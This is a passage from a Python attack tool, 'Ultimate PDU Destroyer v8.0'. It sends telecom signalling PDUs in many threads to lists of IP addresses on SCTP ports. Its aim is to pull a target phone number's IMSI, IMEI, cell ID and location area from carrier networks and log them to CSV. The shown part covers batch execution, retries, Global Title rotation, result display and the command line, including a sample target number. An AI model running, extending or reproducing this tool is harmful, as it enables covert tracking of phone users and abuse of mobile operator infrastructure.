                f"   🔢 IMSI: {result.subscriber_info.imsi}",
                f"   📞 MSISDN: {result.subscriber_info.msisdn}",
                f"   📲 IMEI: {result.subscriber_info.imei}",
                f"   ⚡ Extraction Power: {result.subscriber_info.extraction_power}"
            ]
            print_destroyer_box("SUBSCRIBER OBLITERATION", subscriber_content, DestroyerColors.MYTHIC_PURPLE)
        
        # Technical details box
        technical_content = [
            f"📤 Bytes Transmitted: {result.bytes_sent}",
            f"📥 Bytes Received: {result.bytes_received}",
            f"🕐 Connection Time: {result.connection_time_ms:.2f}ms",
            f"🕐 Response Time: {result.response_time_ms:.2f}ms",
            f"🎯 Used SSN: {result.used_ssn}",
            f"📡 Used GT: {result.used_gt}",
            f"🔧 PDU Construction: {'SUCCESS' if result.pdu_construction_success else 'FAILED'}",
            f"⚡ Transmission Power: {result.transmission_power}"
        ]
        
        if result.bytes_sent == 0:
            technical_content.append("🚨 WARNING: ZERO BYTES TRANSMITTED!")
        
        print_destroyer_box("LEGENDARY TECHNICAL DETAILS", technical_content, DestroyerColors.DESTROYER_BLUE)

def save_legendary_result(result: DestroyerScanResult, csv_file: Path):
    """Save result with LEGENDARY precision"""
    
    with destroyer_csv_lock:
        file_exists = csv_file.exists()
        
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            fieldnames = [
                'timestamp', 'ip', 'port', 'success', 'destruction_level', 'tcap_outcome',
                'duration_ms', 'bytes_sent', 'bytes_received', 'connection_time_ms',
                'response_time_ms', 'mcc', 'mnc', 'lac', 'cell_id', 'imsi', 'msisdn',
                'imei', 'used_ssn', 'used_gt', 'pdu_construction_success',
                'transmission_power', 'location_power', 'subscriber_power', 'error_info'
            ]
            
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            
            if not file_exists:
                writer.writeheader()
            
            row_data = {
                'timestamp': result.timestamp,
                'ip': result.ip,
                'port': result.port,
                'success': result.success,
                'destruction_level': result.destruction_level,
                'tcap_outcome': result.tcap_outcome,
                'duration_ms': result.duration_ms,
                'bytes_sent': result.bytes_sent,
                'bytes_received': result.bytes_received,
                'connection_time_ms': result.connection_time_ms,
                'response_time_ms': result.response_time_ms,
                'mcc': result.location_info.mcc,
                'mnc': result.location_info.mnc,
                'lac': result.location_info.lac,
                'cell_id': result.location_info.cell_id,
                'imsi': result.subscriber_info.imsi,
                'msisdn': result.subscriber_info.msisdn,
                'imei': result.subscriber_info.imei,
                'used_ssn': result.used_ssn,
                'used_gt': result.used_gt,
                'pdu_construction_success': result.pdu_construction_success,
                'transmission_power': result.transmission_power,
                'location_power': result.location_info.extraction_power,
                'subscriber_power': result.subscriber_info.extraction_power,
                'error_info': result.error_info
            }
            
            writer.writerow(row_data)

# === 🚀 LEGENDARY BATCH PROCESSOR ===

def execute_legendary_batch(ip_port_pairs: List[Tuple[str, int]], target_msisdn: str) -> List[DestroyerScanResult]:
    """Execute batch scan with GODLIKE efficiency and MAXIMUM destruction"""
    
    results = []
    total_pairs = len(ip_port_pairs)
    
    batch_content = [
        f"🚀 Initiating LEGENDARY batch scan with MAXIMUM destruction",
        f"🎯 Total targets: {total_pairs}",
        f"👥 Destroyer threads: {DESTROYER_CONFIG['max_workers']}",
        f"🔄 Retry attempts: {DESTROYER_CONFIG['retry_attempts']}",
        f"💀 Destruction mode: {DESTROYER_CONFIG['destruction_mode']}",
        f"⚡ Godlike precision: {DESTROYER_CONFIG['godlike_precision']}"
    ]
    
    print_destroyer_box("LEGENDARY BATCH EXECUTION", batch_content, DestroyerColors.FIRE_RED)
    
    with ThreadPoolExecutor(max_workers=DESTROYER_CONFIG['max_workers']) as executor:
        future_to_target = {}
        
        # Submit all scan tasks with LEGENDARY power
        for ip, port in ip_port_pairs:
            for attempt in range(1, DESTROYER_CONFIG['retry_attempts'] + 1):
                future = executor.submit(execute_legendary_scan, ip, port, target_msisdn, attempt)
                future_to_target[future] = (ip, port, attempt)
        
        completed = 0
        total_futures = len(future_to_target)
        
        # Process completed scans with DEMONIC efficiency
        for future in as_completed(future_to_target):
            ip, port, attempt = future_to_target[future]
            
            try:
                result = future.result()
                results.append(result)
                
                # Display significant results or final attempts
                if (result.success or 
                    result.destruction_level != "NONE" or
                    result.bytes_sent == 0 or
                    attempt == DESTROYER_CONFIG['retry_attempts']):
                    display_legendary_result(result, f"{ip}:{port}:A{attempt}")
                
                completed += 1
                
                # Progress updates with LEGENDARY statistics
                if completed % 30 == 0:
                    progress = (completed / total_futures) * 100
                    transmission_failures = sum(1 for r in results if r.bytes_sent == 0)
                    successful_extractions = sum(1 for r in results if r.success)
                    
                    legendary_print(f"📊 LEGENDARY PROGRESS: {completed}/{total_futures} ({progress:.1f}%)", 
                                   DestroyerColors.DIVINE_CYAN, bold=True)
                    legendary_print(f"💀 Successful extractions: {successful_extractions}, TX failures: {transmission_failures}", 
                                   DestroyerColors.GODLIKE_GREEN)
                
                # Add LEGENDARY delay between retries
                if attempt < DESTROYER_CONFIG['retry_attempts'] and not result.success:
                    time.sleep(DESTROYER_CONFIG['retry_delay'])
            
            except Exception as e:
                if legendary_logger:
                    legendary_logger.error(f"Future processing error for {ip}:{port}:{attempt}: {e}")
    
    return results

def display_destroyer_statistics(results: List[DestroyerScanResult]):
    """Display LEGENDARY statistics with GODLIKE precision"""
    
    with legendary_stats_lock:
        stats = DESTROYER_STATS.copy()
    
    # Calculate advanced statistics
    total_devastation_count = sum(1 for r in results if r.destruction_level == "TOTAL_DEVASTATION")
    location_extractions = sum(1 for r in results if r.location_info.cgi_found)
    subscriber_extractions = sum(1 for r in results if r.subscriber_info.imsi != "N/A")
    transmission_failures = sum(1 for r in results if r.bytes_sent == 0)
    
    # Basic statistics box
    basic_stats = [
        f"🎯 Total Attempts: {stats['total_attempts']}",
        f"📤 Successful Transmissions: {stats['successful_transmissions']}",
        f"🚨 Transmission Failures: {stats['transmission_failures']}",
        f"🔧 PDU Construction Successes: {stats['pdu_construction_successes']}",
        f"💥 PDU Construction Failures: {stats['pdu_construction_failures']}"
    ]
    
    print_destroyer_box("LEGENDARY BASIC STATISTICS", basic_stats, DestroyerColors.LEGENDARY_GOLD)
    
    # Destruction statistics box
    destruction_stats = [
        f"💀 TOTAL DEVASTATIONS: {total_devastation_count}",
        f"📍 Location Extractions: {location_extractions}",
        f"📱 Subscriber Extractions: {subscriber_extractions}",
        f"✅ Successful Responses: {stats['successful_responses']}",
        f"⚡ Maximum Power Achieved: {stats['max_power_achieved']}",
        f"🔥 Total Destruction Level: {stats['total_destruction_level']}"
    ]
    
    print_destroyer_box("DESTRUCTION ANALYSIS", destruction_stats, DestroyerColors.FIRE_RED)
    
    # Transmission analysis box
    if stats['total_attempts'] > 0:
        tx_success_rate = (stats['successful_transmissions'] / stats['total_attempts']) * 100
        pdu_success_rate = (stats['pdu_construction_successes'] / stats['total_attempts']) * 100
        
        transmission_stats = [
            f"📊 Transmission Success Rate: {tx_success_rate:.2f}%",
            f"🔧 PDU Construction Success Rate: {pdu_success_rate:.2f}%",
            f"📦 Total Bytes Transmitted: {stats['bytes_transmitted_total']}",
            f"📦 Total Bytes Received: {stats['bytes_received_total']}",
            f"⏰ Timeouts: {stats['timeouts']}",
            f"🔌 Connection Errors: {stats['connection_errors']}"
        ]
        
        if stats['transmission_failures'] > 0:
            transmission_stats.append("⚠️  WARNING: Transmission issues detected!")
        
        if stats['pdu_construction_failures'] > 0:
            transmission_stats.append("🚨 ALERT: PDU construction failures detected!")
        
        color = (DestroyerColors.GODLIKE_GREEN if stats['transmission_failures'] == 0 and 
                stats['pdu_construction_failures'] == 0 else DestroyerColors.BLOOD_RED)
        
        print_destroyer_box("TRANSMISSION ANALYSIS", transmission_stats, color)

# === 🗂️ LEGENDARY UTILITIES ===

def load_destroyer_ips(ips_file: str) -> List[str]:
    """Load IP addresses with LEGENDARY validation"""
    
    ips_path = Path(ips_file)
    
    if not ips_path.exists():
        error_content = [f"❌ IP file not found: {ips_file}"]
        print_destroyer_box("FILE ERROR", error_content, DestroyerColors.BLOOD_RED)
        sys.exit(1)
    
    try:
        with open(ips_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        valid_ips = []
        invalid_count = 0
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            try:
                socket.inet_aton(line)
                valid_ips.append(line)
            except socket.error:
                invalid_count += 1
                if legendary_logger:
                    legendary_logger.warning(f"Invalid IP at line {line_num}: {line}")
        
        load_stats = [f"📋 Loaded {len(valid_ips)} LEGENDARY IPs from {ips_file}"]
        
        if invalid_count > 0:
            load_stats.append(f"⚠️  Rejected {invalid_count} invalid IP addresses")
        
        print_destroyer_box("IP LOADING", load_stats, DestroyerColors.GODLIKE_GREEN)
        
        return valid_ips
        
    except Exception as e:
        error_content = [f"❌ Error loading IP file: {e}"]
        print_destroyer_box("LOADING ERROR", error_content, DestroyerColors.BLOOD_RED)
        sys.exit(1)

def setup_destroyer_environment() -> Tuple[Path, Path]:
    """Setup environment with LEGENDARY precision"""
    
    results_dir = Path(DESTROYER_CONFIG['results_dir'])
    results_dir.mkdir(exist_ok=True)
    
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    session_dir = results_dir / f"destroyer_session_{timestamp}"
    session_dir.mkdir(exist_ok=True)
    
    csv_file = session_dir / f"legendary_results_{timestamp}.csv"
    log_file = session_dir / f"destroyer_log_{timestamp}.log"
    
    env_stats = [
        f"📁 Destroyer directory: {session_dir}",
        f"📊 Results CSV: {csv_file.name}",
        f"📝 Legendary log: {log_file.name}"
    ]
    
    print_destroyer_box("LEGENDARY ENVIRONMENT SETUP", env_stats, DestroyerColors.DIVINE_CYAN)
    
    return csv_file, log_file

def setup_destroyer_logging(log_file: Path) -> logging.Logger:
    """Setup logging with LEGENDARY precision"""
    
    logger = logging.getLogger("legendary_destroyer_v8")
    logger.handlers.clear()
    logger.setLevel(logging.DEBUG)
    
    # Console handler with LEGENDARY formatting
    console_handler = logging.StreamHandler()
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)
    console_handler.setLevel(logging.INFO)
    logger.addHandler(console_handler)
    
    # File handler with DETAILED logging
    file_handler = logging.FileHandler(log_file, encoding='utf-8')
    file_formatter = logging.Formatter(
        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-15s]-%(funcName)-25s:%(lineno)-4d-%(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    file_handler.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    
    return logger

# === 👑 LEGENDARY MAIN EXECUTOR ===

def legendary_main():
    """LEGENDARY main function with GODLIKE orchestration"""
    
    global legendary_logger, legendary_gt_pool
    
    # Display LEGENDARY banner
    destroyer_banner()
    
    # Setup argument parser with LEGENDARY options
    parser = argparse.ArgumentParser(
        description="💀 Ultimate PDU Destroyer v8.0 - LEGENDARY EDITION 💀",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
🔥 LEGENDARY EXAMPLES:
   python ultimate_pdu_destroyer_v8.py --test
   python ultimate_pdu_destroyer_v8.py -t 212681364829 -w 25 -r 3
   python ultimate_pdu_destroyer_v8.py --verbose --destruction-mode
        """
    )
    
    parser.add_argument('-t', '--target', 
                       default=DESTROYER_CONFIG['target_msisdn'],
                       help='Target MSISDN (default: %(default)s)')
    
    parser.add_argument('-i', '--ips',
                       default=DESTROYER_CONFIG['ips_file'],
                       help='IP addresses file (default: %(default)s)')
    
    parser.add_argument('-w', '--workers',
                       type=int,
                       default=DESTROYER_CONFIG['max_workers'],
                       help='Destroyer threads (default: %(default)s)')
    
    parser.add_argument('-r', '--retries',
                       type=int,
                       default=DESTROYER_CONFIG['retry_attempts'],
                       help='Retry attempts (default: %(default)s)')
    
    parser.add_argument('-v', '--verbose',
                       action='store_true',
                       help='Enable LEGENDARY verbose logging')
    
    parser.add_argument('--test',
                       action='store_true',
                       help='Run LEGENDARY test mode')
    
    parser.add_argument('--destruction-mode',
                       action='store_true',
                       help='Enable MAXIMUM destruction mode')
    
    parser.add_argument('--godlike-precision',
                       action='store_true',
                       help='Enable GODLIKE precision mode')
    
    args = parser.parse_args()
    
    # Update DESTROYER configuration
    DESTROYER_CONFIG['target_msisdn'] = args.target
    DESTROYER_CONFIG['ips_file'] = args.ips
    DESTROYER_CONFIG['max_workers'] = args.workers
    DESTROYER_CONFIG['retry_attempts'] = args.retries
    DESTROYER_CONFIG['destruction_mode'] = args.destruction_mode
    DESTROYER_CONFIG['godlike_precision'] = args.godlike_precision
    
    # Setup LEGENDARY environment
    csv_file, log_file = setup_destroyer_environment()
    
    # Setup LEGENDARY logging
    log_level = "DEBUG" if args.verbose else "INFO"
    legendary_logger = setup_destroyer_logging(log_file)
    
    # Initialize LEGENDARY GT Pool
    legendary_gt_pool = LegendaryGTPool(
        SCCP_DESTROYER_CONFIG['cgpa_gt_base'],
        2000  # MASSIVE pool for MAXIMUM variety
    )
    
    # Display LEGENDARY configuration
    config_content = [
        f"🎯 Target MSISDN: {args.target}",
        f"👥 Destroyer Threads: {args.workers}",
        f"🔄 Retry Attempts: {args.retries}",
        f"📝 Verbose Logging: {'ENABLED' if args.verbose else 'DISABLED'}",
        f"💀 Destruction Mode: {'ENABLED' if args.destruction_mode else 'DISABLED'}",
        f"⚡ Godlike Precision: {'ENABLED' if args.godlike_precision else 'DISABLED'}",
        f"🧪 Test Mode: {'ENABLED' if args.test else 'DISABLED'}"
    ]
    
    print_destroyer_box("LEGENDARY CONFIGURATION", config_content, DestroyerColors.LEGENDARY_GOLD)
    
    # LEGENDARY test mode
    if args.test:
        test_content = [
            "🧪 Executing LEGENDARY transmission test...",
            "🔧 Testing PDU construction and transmission",
            "⚡ Single target test with MAXIMUM precision"
        ]
        print_destroyer_box("LEGENDARY TEST MODE", test_content, DestroyerColors.DESTROYER_BLUE)
        
        test_result = execute_legendary_scan("127.0.0.1", 2905, args.target, 1)
        display_legendary_result(test_result, "LEGENDARY-TEST")
        
        test_summary = [
            f"🔧 PDU Construction: {'SUCCESS' if test_result.pdu_construction_success else 'FAILED'}",
            f"📤 Bytes Transmitted: {test_result.bytes_sent}",
            f"🔄 TCAP Outcome: {test_result.tcap_outcome}",
            f"⚡ Transmission Power: {test_result.transmission_power}",
            f"💥 Destruction Level: {test_result.destruction_level}",
            f"✅ Test Status: {'LEGENDARY SUCCESS' if test_result.bytes_sent > 0 else 'NEEDS INVESTIGATION'}"
        ]
        
        color = DestroyerColors.GODLIKE_GREEN if test_result.bytes_sent > 0 else DestroyerColors.BLOOD_RED
        print_destroyer_box("LEGENDARY TEST RESULTS", test_summary, color)
        return
    
    # Load LEGENDARY IP addresses
    ips = load_destroyer_ips(args.ips)
    
    if not ips:
        error_content = ["❌ No valid IPs found for DESTRUCTION"]
        print_destroyer_box("CRITICAL ERROR", error_content, DestroyerColors.BLOOD_RED)
        sys.exit(1)
    
    # Generate IP:port combinations with CHAOTIC distribution
    ip_port_pairs = []
    for ip in ips:
        for port in DESTROYER_CONFIG['sctp_ports']:
            ip_port_pairs.append((ip, port))
    
    # CHAOTIC shuffling for MAXIMUM unpredictability
    random.shuffle(ip_port_pairs)
    
    pair_stats = [f"🎯 Generated {len(ip_port_pairs)} target combinations with CHAOTIC distribution"]
    print_destroyer_box("TARGET GENERATION", pair_stats, DestroyerColors.DIVINE_CYAN)
    
    # Initialize LEGENDARY statistics
    DESTROYER_STATS['start_time'] = time.time()
    
    # Launch notification
    launch_content = [
        f"🚀 LAUNCHING LEGENDARY DESTROYER SCAN...",
        f"⏰ Launch time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC",
        f"🎯 Total combinations: {len(ip_port_pairs)}",
        f"💀 Expected destruction level: MAXIMUM",
        f"⚡ Power level: OVER 9000!!!"
    ]
    
    print_destroyer_box("LEGENDARY SCAN LAUNCH", launch_content, DestroyerColors.FIRE_RED)
    
    try:
        # Execute LEGENDARY batch scan
        results = execute_legendary_batch(ip_port_pairs, args.target)
        
        # Save LEGENDARY results
        save_content = [f"💾 Saving {len(results)} LEGENDARY results..."]
        print_destroyer_box("RESULTS PRESERVATION", save_content, DestroyerColors.DIVINE_CYAN)
        
        for result in results:
            save_legendary_result(result, csv_file)
        
        # Display LEGENDARY statistics
        display_destroyer_statistics(results)
        
        # Calculate final metrics
        successful_results = [r for r in results if r.success]
        total_devastations = [r for r in results if r.destruction_level == "TOTAL_DEVASTATION"]
        location_results = [r for r in results if r.location_info.cgi_found]
        subscriber_results = [r for r in results if r.subscriber_info.imsi != "N/A"]
        transmission_failures = [r for r in results if r.bytes_sent == 0]
        pdu_failures = [r for r in results if not r.pdu_construction_success]
        
        scan_duration = time.time() - DESTROYER_STATS['start_time']
        
        # Final summary with LEGENDARY presentation
        summary_content = [
            f"📊 Total Results: {len(results)}",
            f"💀 Total Devastations: {len(total_devastations)}",
            f"✅ Successful Extractions: {len(successful_results)}",
            f"📍 Location Extractions: {len(location_results)}",
            f"📱 Subscriber Extractions: {len(subscriber_results)}",
            f"🚨 Transmission Failures: {len(transmission_failures)}",
            f"🔧 PDU Construction Failures: {len(pdu_failures)}",
            f"📄 Results saved to: {csv_file}",
            f"📝 Logs saved to: {log_file}",
            f"⏱️  Total Duration: {scan_duration:.2f} seconds"
        ]
        
        if len(transmission_failures) == 0 and len(pdu_failures) == 0:
            summary_content.append("🎉 PERFECT LEGENDARY EXECUTION!")
        elif len(transmission_failures) > 0:
            summary_content.append("⚠️  TRANSMISSION ISSUES DETECTED!")
        
        if len(total_devastations) > 0:
            summary_content.append(f"💀 ACHIEVED {len(total_devastations)} TOTAL DEVASTATIONS!")
        
        final_color = (DestroyerColors.GODLIKE_GREEN if len(transmission_failures) == 0 and len(pdu_failures) == 0
                      else DestroyerColors.FIRE_ORANGE if len(transmission_failures) > 0
                      else DestroyerColors.BLOOD_RED)
        
        print_destroyer_box("LEGENDARY SCAN COMPLETED!", summary_content, final_color)
        
    except KeyboardInterrupt:
        interrupt_content = [
            f"🛑 LEGENDARY SCAN INTERRUPTED by user command",
            f"📊 Partial results may be available in: {csv_file}",
            f"📝 Logs preserved in: {log_file}"
        ]
        print_destroyer_box("SCAN INTERRUPTED", interrupt_content, DestroyerColors.FIRE_ORANGE)
        
    except Exception as e:
        error_content = [
            f"💥 LEGENDARY SCAN EXPLODED with critical error: {e}",
            f"📝 Check legendary log for details: {log_file}",
            f"🔧 This may require LEGENDARY debugging"
        ]
        print_destroyer_box("CRITICAL FAILURE", error_content, DestroyerColors.BLOOD_RED)
        
        if legendary_logger:
            legendary_logger.error(f"LEGENDARY main execution error: {e}", exc_info=True)
        sys.exit(1)
    
    finally:
        if legendary_logger:
            legendary_logger.info("LEGENDARY PDU Destroyer scan completed with MAXIMUM power")

if __name__ == "__main__":
    try:
        legendary_main()
    except Exception as e:
        error_content = [
            f"💥 CATASTROPHIC SYSTEM FAILURE: {e}",
            f"🔧 LEGENDARY DEBUGGING REQUIRED"
        ]
        print_destroyer_box("SYSTEM MELTDOWN", error_content, DestroyerColors.LASER_RED)
        sys.exit(1)
